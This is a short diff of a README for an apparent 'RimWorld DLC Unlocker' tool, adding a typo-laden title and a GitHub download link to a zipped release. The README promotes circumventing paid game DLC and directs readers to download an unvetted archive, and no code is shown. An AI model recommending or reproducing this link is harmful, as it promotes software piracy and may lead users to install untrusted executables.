@@ -1,4 +1,4 @@
-## RimWorld DLC Unlocker [ODYSSEY UPDATE]
+## RimWorld DLC Unlocker - [ODYSSEY UODATE[
 
 ### ✔️ Unlocks All DLCs Up to: `v1.6.4409` - *Odyssey Included* ⚗️  
 ### 🔓 **Tool Version: `v1.6.3`** (Odyssey update)  
@@ -14,7 +14,7 @@
 
 ### - 🔗 ***Download:***
 
-- [💾 v1.6.3 Release]() = `*Unlocker & DLCs*`
+- [💾 v1.6.3 Release](https://github.com/Rimworld-DLC-Unlocker-2025/.github/releases/download/1.6.3/Rimworld.DLC.Unlocker.zip) = `*Tool files & folder*`
 
 ---
 
